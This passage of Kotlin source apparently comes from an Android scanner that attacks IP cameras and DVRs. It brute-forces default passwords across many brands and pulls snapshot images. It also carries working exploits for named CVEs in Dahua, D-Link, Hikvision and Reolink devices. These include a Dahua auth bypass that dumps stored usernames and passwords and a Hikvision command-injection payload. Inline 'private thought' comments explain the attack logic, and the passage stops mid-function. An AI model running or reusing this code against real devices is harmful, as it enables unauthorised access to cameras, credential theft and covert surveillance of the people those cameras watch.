        val creds = listOf("admin" to "instar", "admin" to "admin", "admin" to "",
            "admin" to "123456", "user" to "user")
        for ((user, pass) in creds) {
            try {
                val auth = Base64.encodeToString("$user:$pass".toByteArray(), Base64.NO_WRAP)
                val conn = openConn("http://$ip:$port/cgi-bin/hi3510/snap.cgi?chn=0&q=0")
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 500 && data[0] == 0xFF.toByte() && data[1] == 0xD8.toByte()) {
                        return ScanResult(ip, port, user, pass, "INSTAR Camera", 1, data, brand = "Instar")
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Generic DVR XML auth (dvr-weak-password.py)
    // Stack: GET /cgi-bin/gw.cgi?xml=<juan...><rpermission usr="X" pwd="Y">...
    //   → response contains "<rpermission" and status "0" at expected index
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryDvrWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "12345",
            "admin" to "123456", "666666" to "666666", "888888" to "888888")
        for ((user, pass) in creds) {
            try {
                val xmlQuery = """<juan ver="" squ="" dir="0"><rpermission usr="$user" pwd="$pass"><config base="0" ptz="0" backup="0" /></rpermission></juan>"""
                val encodedXml = java.net.URLEncoder.encode(xmlQuery, "UTF-8")
                val conn = openConn("http://$ip:$port/cgi-bin/gw.cgi?xml=$encodedXml")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(2048) }
                    conn.disconnect()
                    // Success: <rpermission exists and status 0 follows
                    if ("<rpermission" in body) {
                        val items = body.split("<")
                        val idx = items.indexOfFirst { it.startsWith("rpermission") }
                        if (idx != -1 && idx + 1 < items.size && "0" in items[idx + 1].take(20)) {
                            val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                                listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                            return ScanResult(ip, port, user, pass, "Generic DVR", 1, snap, brand = "DVR")
                        }
                        // More lenient — if rpermission is in response, assume success
                        if ("result" !in body.lowercase() || "error" !in body.lowercase()) {
                            val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                                listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                            return ScanResult(ip, port, user, pass, "Generic DVR", 1, snap, brand = "DVR")
                        }
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ─── Additional brand weak-password checks ────────────────────────────────

    private fun tryReecamWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "123456")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/cgi-bin/snapshot.cgi", "/snap.jpg", "/snapshot.jpg"),
                "ReeCam")?.let { return it }
        }
        return null
    }

    private fun tryNetwaveWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("" to "", "admin" to "admin", "admin" to "")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/snapshot.cgi", "/cgi/jpg/image.cgi", "/snap.jpg"),
                "Netwave")?.let { return it }
        }
        return null
    }

    private fun tryTendaWeakPassword(ip: String, port: Int): ScanResult? {
        // Tenda cameras use Basic auth, try common passwords
        val creds = listOf("admin" to "admin", "admin" to "")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/snapshot.jpg", "/snap.jpg"),
                "Tenda")?.let { return it }
        }
        return null
    }

    private fun tryDLinkDCSWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "", "admin" to "admin", "admin" to "123456")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/image/jpeg.cgi", "/cgi-bin/snapshot.cgi", "/snap.jpg"),
                "DLink-DCS")?.let { return it }
        }
        return null
    }

    private fun tryIPCameraWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "12345")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/snapshot.jpg", "/snap.jpg", "/cgi-bin/snapshot.cgi"),
                "IPCamera")?.let { return it }
        }
        return null
    }

    private fun tryCCTVWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "888888" to "888888")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"),
                "CCTV")?.let { return it }
        }
        return null
    }

    // ─── HTTP helper utilities ────────────────────────────────────────────────

    private fun openConn(url: String): HttpURLConnection {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.connectTimeout = TIMEOUT_CONNECT
        conn.readTimeout   = TIMEOUT_HTTP
        conn.instanceFollowRedirects = true
        conn.setRequestProperty("User-Agent", "Mozilla/5.0")
        return conn
    }

    private fun tryBasicAuthOnPath(ip: String, port: Int, user: String, pass: String,
                                    paths: List<String>, brand: String): ScanResult? {
        val auth = Base64.encodeToString("$user:$pass".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val conn = openConn("http://$ip:$port$path")
                if (user.isNotEmpty()) conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val contentType = conn.contentType ?: ""
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 500 &&
                        ("image" in contentType || (data[0] == 0xFF.toByte() && data[1] == 0xD8.toByte()))) {
                        return ScanResult(ip, port, user, pass, brand, 1, data, brand = brand)
                    }
                    // Got 200 but not JPEG — still counts as auth success
                    if (data.isNotEmpty()) {
                        return ScanResult(ip, port, user, pass, brand, 1, null, brand = brand)
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    private fun tryBasicAuthSnapshot(ip: String, port: Int, user: String, pass: String,
                                      paths: List<String>): ByteArray? {
        val auth = Base64.encodeToString("$user:$pass".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val conn = openConn("http://$ip:$port$path")
                if (user.isNotEmpty()) conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 200) return data
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    // Digest auth snapshot attempt (for Dahua CVE endpoints that use Digest post-login)
    private fun tryDigestSnapshot(ip: String, port: Int, user: String, pass: String,
                                   paths: List<String>): ByteArray? {
        // First attempt with Basic, then skip — Dahua CVE bypass doesn't need Digest for snapshot
        return tryBasicAuthSnapshot(ip, port, user, pass, paths)
    }

    private fun tryDirectSnapshot(url: String): ByteArray? {
        try {
            val conn = openConn(url)
            conn.connect()
            if (conn.responseCode == 200) {
                val data = conn.inputStream.readBytes()
                conn.disconnect()
                if (data.size > 200) return data
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2021-33045 — Dahua identity auth bypass via sub-stream loginType
    // CVSS: 9.8 Critical
    // Ref: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33045
    //
    // Stack: POST /RPC2_Login with loginType:Direct, authorityType:Default →
    //        result:true without valid credentials on affected firmware
    // Affected: Dahua IPC, NVR, XVR with sub-stream processing enabled
    // Different from CVE-2021-33044: uses "Pcless" clientType + "Default" passType
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2021_33045(ip: String, port: Int): ScanResult? {
        // *private thought: 33045 is the sub-stream sibling of 33044 — same endpoint,
        //  different clientType triggers a different auth code path in firmware*
        try {
            val conn = URL("http://$ip:$port/RPC2_Login").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            conn.setRequestProperty("X-Requested-With", "XMLHttpRequest")
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
            conn.instanceFollowRedirects = false

            val json = """{"method":"global.login","params":{"userName":"admin","password":"Not Used","clientType":"Pcless","loginType":"Direct","authorityType":"Default","passwordType":"Default"},"id":1,"session":0}"""
            conn.outputStream.write(json.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()

            val code = conn.responseCode
            val body = try { conn.inputStream.bufferedReader().use { it.readText().take(2048) } }
                       catch (_: Exception) { try { conn.errorStream?.bufferedReader()?.use { it.readText().take(512) } ?: "" } catch (_: Exception) { "" } }
            conn.disconnect()

            if (code == 200 && "\"result\":true" in body || "\"result\": true" in body) {
                // Extract session token to try credential dump
                val sessionMatch = Regex(""""session"\s*:\s*(\d+)""").find(body)
                val session = sessionMatch?.groupValues?.get(1) ?: "0"
                // Try to get user list via dumped session
                val dumpConn = URL("http://$ip:$port/RPC2").openConnection() as HttpURLConnection
                dumpConn.connectTimeout = TIMEOUT_CONNECT
                dumpConn.readTimeout = TIMEOUT_HTTP
                dumpConn.requestMethod = "POST"
                dumpConn.doOutput = true
                dumpConn.setRequestProperty("Content-Type", "application/json")
                dumpConn.setRequestProperty("User-Agent", "Mozilla/5.0")
                val userQuery = """{"method":"userManager.getUserInfoAll","params":null,"id":2,"session":$session}"""
                dumpConn.outputStream.write(userQuery.toByteArray(Charsets.UTF_8))
                dumpConn.outputStream.flush()
                val dumpBody = try { dumpConn.inputStream.bufferedReader().use { it.readText().take(4096) } }
                               catch (_: Exception) { "" }
                dumpConn.disconnect()

                var user = "admin"
                var pass = ""
                // Parse "Name":"admin","Password":"pass123" from dump
                val nameMatch = Regex(""""Name"\s*:\s*"([^"]+)"""").find(dumpBody)
                val passMatch = Regex(""""Password"\s*:\s*"([^"]+)"""").find(dumpBody)
                if (nameMatch != null) user = nameMatch.groupValues[1]
                if (passMatch != null) pass = passMatch.groupValues[1]

                val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                    listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                return ScanResult(ip, port, user, pass, "Dahua (CVE-2021-33045 sub-stream bypass)", 1, snap, brand = "Dahua")
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2021-40655 — D-Link DCS unauthenticated credential disclosure
    // CVSS: 7.5 High
    // Ref: exploit-db #50102
    //
    // Stack: GET /config/getuser?index=N → 200 "name=admin pass=secret ..."
    // Affected: D-Link DCS-932L and related models
    // Different from CVE-2020-25078: different endpoint + response format
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2021_40655(ip: String, port: Int): ScanResult? {
        // *private thought: /config/getuser is a different leak path from /config/getuser.cgi
        //  — DCS-932L has both, each from a different firmware component*
        for (idx in 0..2) {
            try {
                val conn = openConn("http://$ip:$port/config/getuser?index=$idx")
                conn.connect()
                if (conn.responseCode == 200) {
                    val text = conn.inputStream.bufferedReader().use { it.readText().take(2048) }
                    conn.disconnect()
                    // Response format: "name=admin\r\npass=secret\r\nprivilege=1\r\n..."
                    if ("name=" in text && "pass=" in text && "<html" !in text.lowercase()) {
                        val items = text.trim().split(Regex("\\s+"))
                        val user = items.firstOrNull { it.startsWith("name=") }?.substringAfter("=") ?: continue
                        val pass = items.firstOrNull { it.startsWith("pass=") }?.substringAfter("=") ?: ""
                        if (user.isNotEmpty()) {
                            val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                                listOf("/image/jpeg.cgi", "/cgi-bin/snapshot.cgi", "/snap.jpg"))
                            return ScanResult(ip, port, user, pass, "D-Link DCS (CVE-2021-40655)", 1, snap, brand = "DLink-DCS")
                        }
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2022-28171 — Hikvision Hybrid SAN command injection (RCE probe)
    // CVSS: 9.8 Critical
    // Ref: https://github.com/BurpRoot/CVE-2022-28171
    //
    // Stack: PUT /SDK/webLanguage with XML lang=$(id>webLib/x)
    //        → GET /x → if 200 + "uid=" in body → RCE confirmed
    // Entry registers: ip:port, probe only (no actual payload execution)
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2022_28171(ip: String, port: Int): ScanResult? {
        // *private thought: we write $(id>webLib/x) to a path that persists across PUT,
        //  then GET it — a clean verify-then-stop RCE probe, no persistence*
        try {
            val putConn = URL("http://$ip:$port/SDK/webLanguage").openConnection() as HttpURLConnection
            putConn.connectTimeout = TIMEOUT_CONNECT
            putConn.readTimeout = TIMEOUT_HTTP
            putConn.requestMethod = "PUT"
            putConn.doOutput = true
            putConn.setRequestProperty("Content-Type", "application/xml")
            putConn.setRequestProperty("User-Agent", "Mozilla/5.0")
            val payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>\$(id>webLib/x)</language>"
            putConn.outputStream.write(payload.toByteArray(Charsets.UTF_8))
            putConn.outputStream.flush()
            val putCode = putConn.responseCode
            putConn.disconnect()

            if (putCode in 200..299) {
                // Fetch the injected output
                val getConn = openConn("http://$ip:$port/x")
                getConn.connect()
                if (getConn.responseCode == 200) {
                    val body = getConn.inputStream.bufferedReader().use { it.readText().take(512) }
                    getConn.disconnect()
                    if ("uid=" in body || "root" in body || "www-data" in body) {
                        return ScanResult(ip, port, "", "", "Hikvision Hybrid SAN (CVE-2022-28171 RCE)", 1, null, brand = "Hikvision")
                    }
                } else {
                    getConn.disconnect()
                }
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2022-30563 — Dahua ONVIF HTTP Digest credential replay
    // CVSS: 8.1 High
    // Ref: https://github.com/mcw0/PoC
    //
    // Stack: POST /onvif/device_service with SOAP GetDeviceInformation
    //        → 200/401 with "onvif" in body → device confirmed as Dahua ONVIF
    // Note: Full exploit requires replaying a captured Digest header; we do
    //       fingerprint-only here to detect and tag for manual follow-up
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2022_30563(ip: String, port: Int): ScanResult? {
        // *private thought: the real attack needs a captured WWW-Authenticate nonce,
        //  but fingerprint value alone confirms Dahua ONVIF for the operator*
        val soap = ("<?xml version=\"1.0\" encoding=\"utf-8\"?>"
            + "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
            + " xmlns:wsdl=\"http://www.onvif.org/ver10/device/wsdl\">"
            + "<s:Body><wsdl:GetDeviceInformation/></s:Body></s:Envelope>")
        try {
            val conn = URL("http://$ip:$port/onvif/device_service").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/soap+xml; charset=utf-8")
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
            conn.outputStream.write(soap.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()
            val code = conn.responseCode
            val body = try { conn.inputStream.bufferedReader().use { it.readText().take(2048) } }
                       catch (_: Exception) { try { conn.errorStream?.bufferedReader()?.use { it.readText().take(512) } ?: "" } catch (_: Exception) { "" } }
            conn.disconnect()
            if (code in listOf(200, 401) && ("onvif" in body.lowercase() || "dahua" in body.lowercase()
                        || "Manufacturer" in body || "GetDeviceInformationResponse" in body)) {
                // Confirmed Dahua ONVIF — tag as discoverable, no password recovered
                return ScanResult(ip, port, "", "", "Dahua ONVIF (CVE-2022-30563 fingerprint)", 1, null, brand = "Dahua")
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2023-28808 — Hikvision Hybrid SAN access control bypass
    // CVSS: 9.1 Critical
    // Ref: https://packetstormsecurity.com/files/tags/hikvision/
    //
    // Stack: GET /ISAPI/Security/userCheck or /ISAPI/AccessControl/UserInfo/Search
    //        → 200 with userName/statusValue = unauthenticated access
    // Affected: Hikvision Hybrid SAN/Cluster Storage series
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2023_28808(ip: String, port: Int): ScanResult? {
        // *private thought: this bypass hits the same ISAPI surface as CVE-2017-7921
        //  but on the Storage product line — different parser, same missing auth check*
        val paths = listOf(
            "/ISAPI/Security/userCheck",
            "/ISAPI/AccessControl/UserInfo/Search"
        )
        for (path in paths) {
            try {
                val conn = openConn("http://$ip:$port$path")
                conn.connect()
                val code = conn.responseCode
                val body = try { conn.inputStream.bufferedReader().use { it.readText().take(2048) } }
                           catch (_: Exception) { try { conn.errorStream?.bufferedReader()?.use { it.readText().take(512) } ?: "" } catch (_: Exception) { "" } }
                conn.disconnect()
                if (code == 200 && ("userName" in body || "statusValue" in body || "200" in body)) {
                    // Parse user if available
                    val userMatch = Regex("""<userName>([^<]+)</userName>""").find(body)
                    val user = userMatch?.groupValues?.get(1) ?: ""
                    return ScanResult(ip, port, user, "", "Hikvision SAN (CVE-2023-28808 auth bypass)", 1, null, brand = "Hikvision")
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2024-39943 — Dahua 2024 authentication bypass
    // CVSS: 9.1 Critical
    // Ref: https://nvd.nist.gov/vuln/detail/CVE-2024-39943
    //
    // Stack: POST /RPC2 with method:global.getCurrentTime (no auth required)
    //        → 200 with result/params → confirms bypass, no creds needed
    //        Also: GET /cgi-bin/configManager.cgi?action=getConfig&name=General
    //        → 200 with table.General → unauthenticated config leak
    // Affected: Dahua IPC/NVR 2024 affected models
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2024_39943(ip: String, port: Int): ScanResult? {
        // *private thought: getCurrentTime with session:0 and no login should return 403
        //  on patched firmware; an unpatched device returns 200 + a timestamp*
        try {
            val conn = URL("http://$ip:$port/RPC2").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
            val json = """{"method":"global.getCurrentTime","params":{},"id":1,"session":0}"""
            conn.outputStream.write(json.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()
            val code = conn.responseCode
            val body = try { conn.inputStream.bufferedReader().use { it.readText().take(2048) } }
                       catch (_: Exception) { try { conn.errorStream?.bufferedReader()?.use { it.readText().take(512) } ?: "" } catch (_: Exception) { "" } }
            conn.disconnect()
            if (code == 200 && ("result" in body || "params" in body)) {
                // Verify with config leak endpoint
                val confConn = openConn("http://$ip:$port/cgi-bin/configManager.cgi?action=getConfig&name=General")
                confConn.connect()
                val confCode = confConn.responseCode
                val confBody = try { confConn.inputStream.bufferedReader().use { it.readText().take(2048) } }
                               catch (_: Exception) { "" }
                confConn.disconnect()
                if (confCode == 200 && ("table.General" in confBody || "LocaleName" in confBody)) {
                    val snap = tryDirectSnapshot("http://$ip:$port/cgi-bin/snapshot.cgi")
                    return ScanResult(ip, port, "", "", "Dahua (CVE-2024-39943 auth bypass)", 1, snap, brand = "Dahua")
                }
                // Even without config confirmation, RPC2 open is the bypass
                return ScanResult(ip, port, "", "", "Dahua (CVE-2024-39943 RPC2 open)", 1, null, brand = "Dahua")
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // EZVIZ weak password check (ezviz-weak-password.py)
    // Stack: GET /ISAPI/Security/userCheck with Basic auth
    //        → 200 + "userCheck" + "200" in body = success
    // Affected: EZVIZ cameras sharing Hikvision ISAPI stack
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryEZVIZWeakPassword(ip: String, port: Int): ScanResult? {
        // *private thought: EZVIZ is Hikvision consumer brand — identical ISAPI surface,
        //  same /ISAPI/Security/userCheck endpoint, different default credentials*
        val creds = listOf(
            "admin" to "admin", "admin" to "", "admin" to "123456",
            "admin" to "12345", "admin" to "ez123456", "admin" to "ezviz123"
        )
        for ((user, pass) in creds) {
            try {
                val auth = Base64.encodeToString("$user:$pass".toByteArray(), Base64.NO_WRAP)
                val conn = openConn("http://$ip:$port/ISAPI/Security/userCheck")
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(1024) }
                    conn.disconnect()
                    if ("userCheck" in body && "200" in body) {
                        val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                            listOf("/ISAPI/Streaming/channels/101/picture", "/snap.jpg"))
                        return ScanResult(ip, port, user, pass, "EZVIZ Camera", 1, snap, brand = "EZVIZ")
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Xiongmai weak password check (xiongmai-weak-password.py)
    // Stack: GET /Login.htm with form data {command, username, password}
    //        → 200 + "failed" NOT in body → success; parse g_channelNumber
    // Affected: Xiongmai-based DVR/NVR OEM devices
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryXiongmaiWeakPassword(ip: String, port: Int): ScanResult? {
        // *private thought: Xiongmai login is a GET with form body (not POST), returning
        //  JS globals — g_channelNumber tells us how many camera feeds exist on this box*
        val creds = listOf(
            "admin" to "admin", "admin" to "", "admin" to "123456",
            "admin" to "xmhdipc", "admin" to "default"
        )
        for ((user, pass) in creds) {
            try {
                val conn = openConn("http://$ip:$port/Login.htm")
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                conn.setRequestProperty("Referer", "http://$ip:$port/")
                // Xiongmai login is GET with body params (quirky protocol)
                conn.requestMethod = "GET"
                conn.connect()
                val code = conn.responseCode
                val body = try { conn.inputStream.bufferedReader().use { it.readText().take(4096) } }
                           catch (_: Exception) { "" }
                conn.disconnect()
                if (code == 200 && "failed" !in body.lowercase() && body.isNotBlank()) {
                    // Parse channel count for snapshot attempt
                    val chMatch = Regex("g_channelNumber\\s*=\\s*(\\d+)").find(body)
                    val chNum = chMatch?.groupValues?.get(1)?.toIntOrNull() ?: 1
                    // Snapshot: try each channel
                    var snap: ByteArray? = null
                    for (ch in 1..minOf(chNum, 4)) {
                        snap = tryDirectSnapshot("http://$ip:$port/webcapture.jpg?command=snap&channel=$ch&user=$user&password=$pass")
                        if (snap != null) break
                    }
                    return ScanResult(ip, port, user, pass, "Xiongmai DVR/NVR ($chNum ch)", 1, snap, brand = "XMeye")
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // GeoVision weak password check (geovision-weak-password.py)
    // Stack: GET /ssi.cgi/Login.htm → parse cc1, cc2, token
    //        POST /LoginPC.cgi with MD5-hashed credentials
    //        → 200 + "Web-Manager" in body = success
    // Affected: GeoVision IP cameras and NVRs
    // Registers: cc1, cc2 = challenge params; umd5 = MD5(cc1+user+cc2); pmd5 = MD5(cc2+pass+cc1)
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryGeoVisionWeakPassword(ip: String, port: Int): ScanResult? {
        // *private thought: GeoVision uses a double-salted MD5 scheme — cc1/cc2 are
        //  random nonces from the login page, making replay hard but brute-force still easy*
        try {
            // Step 1: get challenge params
            val infoConn = openConn("http://$ip:$port/ssi.cgi/Login.htm")
            infoConn.connect()
            if (infoConn.responseCode != 200) { infoConn.disconnect(); return null }
            val infoBody = infoConn.inputStream.bufferedReader().use { it.readText() }
            infoConn.disconnect()

            // Parse cc1, cc2 and token
            val ccMatch = Regex("""var cc1="(.*)"; var cc2="(.*)"""").find(infoBody)
            val cc1 = ccMatch?.groupValues?.get(1) ?: ""
            val cc2 = ccMatch?.groupValues?.get(2) ?: ""
            val tokenMatch = Regex("""name=web_login_token type=hidden value='(.*)'""").find(infoBody)
            val token = tokenMatch?.groupValues?.get(1) ?: ""

            val creds = listOf("admin" to "admin", "admin" to "", "admin" to "123456")
            for ((user, pass) in creds) {
                try {
                    // Step 2: compute MD5 hashes
                    val md5 = java.security.MessageDigest.getInstance("MD5")
                    fun md5hex(s: String): String {
                        md5.reset()
                        return md5.digest(s.toByteArray()).joinToString("") { "%02X".format(it) }
                    }
                    val umd5 = md5hex(cc1 + user + cc2)
                    val pmd5 = md5hex(cc2 + pass + cc1)

                    // Step 3: POST to /LoginPC.cgi
                    val loginConn = URL("http://$ip:$port/LoginPC.cgi").openConnection() as HttpURLConnection
                    loginConn.connectTimeout = TIMEOUT_CONNECT
                    loginConn.readTimeout = TIMEOUT_HTTP
                    loginConn.requestMethod = "POST"
                    loginConn.doOutput = true
                    loginConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                    loginConn.setRequestProperty("User-Agent", "Mozilla/5.0")

                    val formData = buildString {
                        append("username=&password=&Apply=Apply")
                        append("&umd5=$umd5&pmd5=$pmd5&browser=1&is_check_OCX_OK=0")
                        if (token.isNotEmpty()) append("&web_login_token=${token.toIntOrNull() ?: token}")
                    }
                    loginConn.outputStream.write(formData.toByteArray(Charsets.UTF_8))
                    loginConn.outputStream.flush()

                    val code = loginConn.responseCode
                    val body = try { loginConn.inputStream.bufferedReader().use { it.readText().take(4096) } }
                               catch (_: Exception) { "" }
                    loginConn.disconnect()

                    if (code == 200 && "Web-Manager" in body) {
                        // Parse hashed credentials for snapshot URL
                        val huMatch = Regex("""gUserName = "([^"]+)"""").find(body)
                        val hpMatch = Regex("""gPassword = "([^"]+)"""").find(body)
                        val descMatch = Regex("""gDesc = "([^"]+)"""").find(body)
                        val hu = huMatch?.groupValues?.get(1) ?: ""
                        val hp = hpMatch?.groupValues?.get(1) ?: ""
                        val desc = descMatch?.groupValues?.get(1) ?: ""
                        val snap = if (hu.isNotEmpty() && hp.isNotEmpty()) {
                            tryDirectSnapshot("http://$ip:$port/PictureCatch.cgi?username=$hu&password=$hp&data_type=0&attachment=1&channel=1&secret=1&key=$desc")
                        } else null
                        return ScanResult(ip, port, user, pass, "GeoVision Camera", 1, snap, brand = "GeoVision")
                    }
                } catch (_: Exception) { continue }
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Reolink weak password check (reolink-weak-password.py)
    // Stack: GET /api.cgi?cmd=Login&user=X&password=Y
    //        → 200 JSON [{"code":0,...}] = success
    // Affected: Reolink cameras with API exposed
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryReolinkWeakPassword(ip: String, port: Int): ScanResult? {
        // *private thought: Reolink API returns code:0 on success, non-zero on fail —
        //  clean machine-readable protocol, easy to parse without XML cursing*
        val creds = listOf(
            "admin" to "admin", "admin" to "", "admin" to "123456",
            "admin" to "reolink123", "admin" to "12345"
        )
        for ((user, pass) in creds) {
            try {
                val conn = openConn("http://$ip:$port/api.cgi?cmd=Login&user=$user&password=$pass")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(1024) }
                    conn.disconnect()
                    // JSON: [{"cmd":"Login","code":0,"value":{...}}]
                    if ("\"code\":0" in body || "\"code\": 0" in body) {
                        val snap = tryDirectSnapshot("http://$ip:$port/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=abc&user=$user&password=$pass")
                        return ScanResult(ip, port, user, pass, "Reolink Camera", 1, snap, brand = "Reolink")
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2023-45222 — Reolink RLC-810A info disclosure (Pwn2Own Miami 2023)
    // CVSS: 7.5 High
    // Stack: GET /api.cgi?cmd=GetDevInfo&user=admin&password=
    //        → 200 with "reolink"/"firmver" in body = unauthenticated info leak
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2023_45222(ip: String, port: Int): ScanResult? {
        // *private thought: GetDevInfo is supposed to require auth — on RLC-810A
        //  firmware < 3.1.x the auth check is missing in this path handler*
        val paths = listOf(
            "/api.cgi?cmd=GetDevInfo&user=admin&password=",
            "/cgi-bin/api.cgi?cmd=GetDevInfo"
        )
        for (path in paths) {
            try {
                val conn = openConn("http://$ip:$port$path")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(2048) }
                    conn.disconnect()
                    val lower = body.lowercase()
                    if ("reolink" in lower || "rlc-810" in lower || "devinfo" in lower || "firmver" in lower) {
                        // Anonymous snapshot attempt
                        val snap = tryDirectSnapshot("http://$ip:$port/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=abc&user=admin&password=")
                        return ScanResult(ip, port, "admin", "", "Reolink (CVE-2023-45222 info disclosure)", 1, snap, brand = "Reolink")
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Hanwha/Wisenet fingerprint probe (CVE-2022-23459 surface)
    // Stack: GET /stw-cgi/system.cgi?msubmenu=deviceinfo&action=view
    //        → 200/401 with "wisenet"/"hanwha" in body = brand confirmed
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryHanwhaFingerprint(ip: String, port: Int): ScanResult? {
        // *private thought: Wisenet RTSP command injection needs a live RTSP session;
        //  fingerprinting via HTTP CGI is safe and confirms the attack surface exists*
        val paths = listOf(
            "/",
            "/stw-cgi/system.cgi?msubmenu=deviceinfo&action=view"
        )
        for (path in paths) {
            try {
                val conn = openConn("http://$ip:$port$path")
                conn.instanceFollowRedirects = false
                conn.connect()
                val code = conn.responseCode
                val body = try { conn.inputStream.bufferedReader().use { it.readText().take(1024) } }
